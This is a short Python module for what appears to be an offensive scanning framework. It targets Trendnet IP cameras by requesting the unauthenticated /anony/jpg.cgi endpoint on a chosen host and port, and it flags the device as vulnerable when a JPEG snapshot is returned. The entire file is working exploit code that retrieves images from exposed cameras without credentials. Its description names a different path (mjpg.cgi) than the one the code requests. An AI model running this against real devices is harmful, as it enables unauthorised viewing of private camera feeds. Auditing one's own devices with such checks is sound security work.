import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "trendnet/anony_stream_scan"
        self.description = "Unauthenticated anonymous live feed leak scanner for Trendnet cameras (/anony/mjpg.cgi)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        # Test sur la capture d'image ou le flux CGI anonyme
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/anony/jpg.cgi"
        else:
            url = f"{target.rstrip('/')}/anony/jpg.cgi"
            
        try:
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                response = await client.get(url)
                
                # Si le serveur répond 200 et que le type de contenu renvoyé est une image JPEG
                content_type = response.headers.get("Content-Type", "").lower()
                if response.status_code == 200 and ("image" in content_type or response.content.startswith(b'\xff\xd8')):
                    return {
                        "vulnerable": True,
                        "details": "Trendnet bypass confirmed. Live camera endpoints in /anony/ are publicly exposed."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
            
        return {"vulnerable": False}
